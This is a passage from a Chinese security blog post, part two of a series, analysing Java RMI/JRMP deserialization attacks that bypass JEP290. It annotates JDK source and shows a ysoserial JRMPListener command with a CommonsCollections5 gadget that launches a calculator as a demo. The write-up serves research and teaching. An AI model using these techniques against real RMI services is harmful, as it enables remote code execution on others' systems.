<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="字数：1w5 推荐阅读时间：&amp;gt;2h 前言再看下RMI反序列化攻击的总结图：  如果觉得有什么出入，喷就完事了；同时觉得本文对你有帮助，也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃….. 咳…在上篇中已经讲述针对已知RMI接口的三种攻击方式与针对RMI层（RMI注册端、RMI服务端）/DGC层，得出了部分结论。 而在下篇中将重">
<meta name="keywords" content="java,rmi">
<meta property="og:type" content="article">
<meta property="og:title" content="RMI-反序列化-深入-下">
<meta property="og:url" content="http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/index.html">
<meta property="og:site_name" content="啦啦菌NODE">
<meta property="og:description" content="字数：1w5 推荐阅读时间：&amp;gt;2h 前言再看下RMI反序列化攻击的总结图：  如果觉得有什么出入，喷就完事了；同时觉得本文对你有帮助，也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃….. 咳…在上篇中已经讲述针对已知RMI接口的三种攻击方式与针对RMI层（RMI注册端、RMI服务端）/DGC层，得出了部分结论。 而在下篇中将重">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg1782mvi0j321b0udwrj.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg178eusk1j30w10b6t9q.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg178plaw1j317617hnav.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179a6qkrj31r50f5whh.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179gvpt6j31d10yj0yx.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179nw4ikj31gs0q7dja.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179tjfqgj31nf0twn3i.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17a0o9vlj30qw0eedhw.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17an3i2aj325h175kc6.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17askso1j320p12in1p.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17b0fw5qj323u11igzp.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17b654atj31i00l30wb.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17bgrq6oj324a17marh.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17br86p2j31mg15jqbm.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17d62azlj31500s80vo.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dcc242j31mq0vwaen.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dhs3z2j31fr0vtn14.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dpwbddj31fc0btmzt.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17e29802j31m00qz77a.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17e8s4orj323o0xcqh5.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17ei6nrcj31qk0j0tb6.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17fk9n04j31b10bin3g.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17g0msfwj325v0jiwid.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17g7sshcj31wj14kdk3.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gdrr1nj32090ow40n.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gjbogdj329v17zn66.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gtcj7cj31af0pmtkp.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17gxie69j30rf08hq32.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17h6iywgj31200b9wf8.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hh2wrsj31nf0twn3i.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hpn58uj327l0v3441.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17hwesedj31i10oojt1.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17i6p8nkj31tt0spqih.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17ivy1q8j320m11dgxv.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17j29sk8j317m0d6wfk.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jj8ahcj31tt0spqih.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jqcprij32bc0j377m.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jwlsnjj31hi11agqx.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg">
<meta property="og:updated_time" content="2020-06-24T03:28:43.510Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RMI-反序列化-深入-下">
<meta name="twitter:description" content="字数：1w5 推荐阅读时间：&amp;gt;2h 前言再看下RMI反序列化攻击的总结图：  如果觉得有什么出入，喷就完事了；同时觉得本文对你有帮助，也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃….. 咳…在上篇中已经讲述针对已知RMI接口的三种攻击方式与针对RMI层（RMI注册端、RMI服务端）/DGC层，得出了部分结论。 而在下篇中将重">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>RMI-反序列化-深入-下</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/06/28/windows下打造顺手的搬砖环境—PentestBox/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/06/22/RMI 反序列化-深入-上/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&text=RMI-反序列化-深入-下"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&is_video=false&description=RMI-反序列化-深入-下"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RMI-反序列化-深入-下&body=Check out this article: http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&title=RMI-反序列化-深入-下"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-下/&name=RMI-反序列化-深入-下&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用JRMP反序列化绕过JEP290"><span class="toc-number">2.</span> <span class="toc-text">利用JRMP反序列化绕过JEP290</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener"><span class="toc-number">2.1.</span> <span class="toc-text">JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#复现"><span class="toc-number">2.1.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与RMI服务端反序列化攻击RMI注册端-Bind结合"><span class="toc-number">2.2.</span> <span class="toc-text">与RMI服务端反序列化攻击RMI注册端-Bind结合</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UnicastRef对象"><span class="toc-number">2.2.1.</span> <span class="toc-text">UnicastRef对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#与bind操作进行拼接"><span class="toc-number">2.2.2.</span> <span class="toc-text">与bind操作进行拼接</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-绕过客户端-自实现协议"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">1.绕过客户端-自实现协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-动态代理-自定义"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">2.动态代理-自定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-找一个带UnicastRef类型参数的实现Remote接口的类"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">3.找一个带UnicastRef类型参数的实现Remote接口的类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#RemoteObjectInvocationHandler"><span class="toc-number">2.2.2.4.1.</span> <span class="toc-text">RemoteObjectInvocationHandler</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RMIConnectionImpl-Stub"><span class="toc-number">2.2.2.4.2.</span> <span class="toc-text">RMIConnectionImpl_Stub</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UnicastRemoteObject"><span class="toc-number">2.2.2.4.3.</span> <span class="toc-text">UnicastRemoteObject</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#新的小问题-RemoteObjectInvocationHandler为啥又可以了"><span class="toc-number">2.2.2.4.4.</span> <span class="toc-text">新的小问题-RemoteObjectInvocationHandler为啥又可以了</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#绕过序列化过程中的替换使所有类均可用于攻击"><span class="toc-number">2.2.2.4.5.</span> <span class="toc-text">绕过序列化过程中的替换使所有类均可用于攻击</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-带UnicastRef类型参数的实现Remote接口的类—自定义"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">4.带UnicastRef类型参数的实现Remote接口的类—自定义</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind的局限性"><span class="toc-number">2.2.3.</span> <span class="toc-text">bind的局限性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与RMI客户端反序列化攻击RMI服务端-Lookup结合"><span class="toc-number">2.3.</span> <span class="toc-text">与RMI客户端反序列化攻击RMI服务端-Lookup结合</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于Barmie拦截器的自实现"><span class="toc-number">2.3.1.</span> <span class="toc-text">基于Barmie拦截器的自实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重实现lookup逻辑"><span class="toc-number">2.3.2.</span> <span class="toc-text">重实现lookup逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u231的修复"><span class="toc-number">2.4.</span> <span class="toc-text">8u231的修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一处修复"><span class="toc-number">2.4.1.</span> <span class="toc-text">第一处修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二处修复"><span class="toc-number">2.4.2.</span> <span class="toc-text">第二处修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#来自An-Trinh的另一种绕过JEP290的思路"><span class="toc-number">3.</span> <span class="toc-text">来自An Trinh的另一种绕过JEP290的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现—绕过8u231"><span class="toc-number">3.1.</span> <span class="toc-text">复现—绕过8u231</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u241的修复第一处"><span class="toc-number">3.2.</span> <span class="toc-text">8u241的修复第一处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bind加上IP限制枷锁还可以用？"><span class="toc-number">3.3.</span> <span class="toc-text">bind加上IP限制枷锁还可以用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8u241的修复第二处"><span class="toc-number">3.4.</span> <span class="toc-text">8u241的修复第二处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结-amp-总结"><span class="toc-number">4.</span> <span class="toc-text">小结&amp;总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        RMI-反序列化-深入-下
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">啦啦菌NODE</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-06-22T09:15:33.000Z" itemprop="datePublished">2020-06-22</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/java/">java</a>, <a class="tag-link" href="/tags/rmi/">rmi</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>字数：1w5</p>
<p>推荐阅读时间：&gt;2h</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>再看下RMI反序列化攻击的总结图：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="总结图.png"></p>
<p>如果觉得有什么出入，喷就完事了；<br>同时觉得本文对你有帮助，<del>也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃…..</del></p>
<p>咳…在上篇中已经讲述<strong>针对已知RMI接口的三种攻击方式</strong>与<strong>针对RMI层（RMI注册端、RMI服务端）/DGC层</strong>，得出了部分结论。</p>
<p>而在下篇中将重点讲述<strong>绕过JEP290的引入JRMP的利用方式</strong>，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。</p>
<p>上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传<a href="https://github.com/lalajun/RMIDeserialize" target="_blank" rel="noopener">github</a>。</p>
<p>此外安利下<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>，如果没有意外的话，之后会陆续把这些攻击方式都移植过去。</p>
<h2 id="利用JRMP反序列化绕过JEP290"><a href="#利用JRMP反序列化绕过JEP290" class="headerlink" title="利用JRMP反序列化绕过JEP290"></a>利用JRMP反序列化绕过JEP290</h2><p>在上篇中我们所有攻击方式都给JEP290给干掉了，当然出了参数利用的方式，但是那种利用局限性太强了。来看看绕过JEP290的攻击方式。</p>
<p>先进行攻击演示：</p>
<ol>
<li>使用github中的<code>ServerandRegister.java</code>作为受害者靶机</li>
<li>运行<code>java -cp F:\BanZ\java\ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 &quot;calc&quot;</code>作为攻击者自实现的JRMP服务端</li>
<li>运行github中的<code>Bypass290.java</code>作为攻击代码</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg1782mvi0j321b0udwrj.jpg" alt="绕过JEP290-bind命令执行.png"></p>
<p>再来讲绕过原理的前置知识：</p>
<h3 id="JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener"><a href="#JRMP服务端打JRMP客户端-ysoserial-exploit-JRMPListener" class="headerlink" title="JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)"></a>JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)</h3><blockquote>
<p>这其实就是ysoserial.exploit.JRMPListener模块的攻击逻辑</p>
</blockquote>
<blockquote>
<p>其实之前标题为DGC服务端打DGC客户端，在别的文章评论区如此说的时候，被<a href="https://www.anquanke.com/post/id/204740#h2-15" target="_blank" rel="noopener">老哥</a>指出来不对：这里的漏洞触发跟DGC没关系。</p>
<p>实际去仔细看了调用栈的确不经过DGC，由于自己看的时候是从<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>跳转进去的所以就当成DGC层。</p>
<p>实际上应该归为JRMP层，JRMP是DGC和RMI底层通讯层，DGC和RMI的最终调用都回到JRMP这一层来，但是这种理论归属知道个大概就好，其实我也不是很确定QAQ。</p>
</blockquote>
<p>我们之前在看DGC层反序列化的时候，下的客户端断点是在<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>，然后回退到调用栈的dirty方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Lease <span class="title">dirty</span><span class="params">(ObjID[] var1, <span class="keyword">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//开启了一个连接，似曾相识的 669196253586618813L 在服务端也有</span></span><br><span class="line">            RemoteCall var5 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取连接的输入流</span></span><br><span class="line">                ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">                <span class="comment">//***DGC客户端攻击DGC服务端的payload写入处***</span></span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//进入此处</span></span><br><span class="line">            <span class="keyword">super</span>.ref.invoke(var5);</span><br></pre></td></tr></table></figure>
<p>dirty方法中通过<code>super.ref.invoke(var5);</code>进入<code>sun.rmi.server.UnicastRef#invoke</code></p>
<p>在这里进行了</p>
<ol>
<li>发送了之前处理好的序列化数据包</li>
<li>处理了服务端的报错返回。而<strong>反序列化问题正是出现在这里</strong></li>
</ol>
<p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//写个日志，不管</span></span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">"execute call"</span>);</span><br><span class="line"> <span class="comment">//跟进此处</span></span><br><span class="line">        call.executeCall();</span><br><span class="line">        <span class="comment">//...省略一堆报错处理</span></span><br></pre></td></tr></table></figure>
<p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read result header</span></span><br><span class="line">        DGCAckHandler ackHandler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//...这里发包和接受返回状态returnType和返回包数据流in</span></span><br><span class="line">            returnType = in.readByte();  <span class="comment">//1. 反序列化一个returnType</span></span><br><span class="line">            in.readID();        <span class="comment">// 2. 反序列化一个id for DGC acknowledgement</span></span><br><span class="line">            <span class="comment">//具体细节比较复杂不看了</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">            <span class="comment">//..略..</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理returnType返回状态</span></span><br><span class="line">        <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">        <span class="comment">//这是常量1</span></span><br><span class="line">        <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//这是常量2</span></span><br><span class="line">        <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">            Object ex;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//3. 从服务端返回数据流in中读取，并反序列化</span></span><br><span class="line">                <span class="comment">//***漏洞触发点***</span></span><br><span class="line">                ex = in.readObject();</span><br><span class="line">                <span class="comment">//省略之后代码</span></span><br></pre></td></tr></table></figure>
<p>JRMP客户端反序列化顺序：</p>
<ol>
<li>反序列化服务端给的returnType</li>
<li>反序列化服务端给的一个ID</li>
<li>反序列化服务端给的报错信息</li>
</ol>
<blockquote>
<p>小问题：为啥一定要利用报错信息写payload，前两个不可以么？</p>
<p>当然不可以，readObject才行，不懂的话….. 不懂你也看不到这里。。打扰了</p>
</blockquote>
<blockquote>
<p>此外自己在看的时候发现了一个自己模糊的问题：JAVA反序列化序列化 是队列形式的还是栈形式的？</p>
<p>即：out.writeObject(a)；out.writeObject(a)；out.readObejct()的结果是a还是b</p>
<p>是a，队列形式</p>
</blockquote>
<p>那我们知道了JRMP客户端存在一个反序列化点，是可以被攻击，再来看看对应的服务端是在哪里插入payload的（我们已经知道了大概是一个报错信息处）</p>
<p>这里网上的文章大多是直接拿yso exploit的JRMPlistener攻击代码来看了，那个代码是直接重构了JRMP服务端，把报错信息改成payload的，但是都没有说原生服务端在哪里写序列化。（虽然这个问题对于实际攻击利用没有太大意义，还是来看下）</p>
<p>可以看到上面客户端代码对于服务端传输过来的<code>returnType</code>判断为<code>TransportConstants.ExceptionalReturn</code>才会进入反序列化流程。那么我们来全局搜索<code>TransportConstants.ExceptionalReturn</code>就可以找到服务端在哪里写入的了。</p>
<p>发现服务端的代码就在同个java文件下<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectOutput <span class="title">getResultStream</span><span class="params">(<span class="keyword">boolean</span> success)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (resultStarted)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"result already in progress"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        resultStarted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    DataOutputStream wr = <span class="keyword">new</span> DataOutputStream(conn.getOutputStream());</span><br><span class="line">    wr.writeByte(TransportConstants.Return);</span><br><span class="line">    getOutputStream(<span class="keyword">true</span>);  </span><br><span class="line">    <span class="comment">//success为false，进入我们的分支</span></span><br><span class="line">    <span class="keyword">if</span> (success)  </span><br><span class="line">        out.writeByte(TransportConstants.NormalReturn);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//*******这里第一个序列化returnType*******</span></span><br><span class="line">        out.writeByte(TransportConstants.ExceptionalReturn);</span><br><span class="line">    <span class="comment">//第二个序列化一个ID</span></span><br><span class="line">    out.writeID();          <span class="comment">// write id for 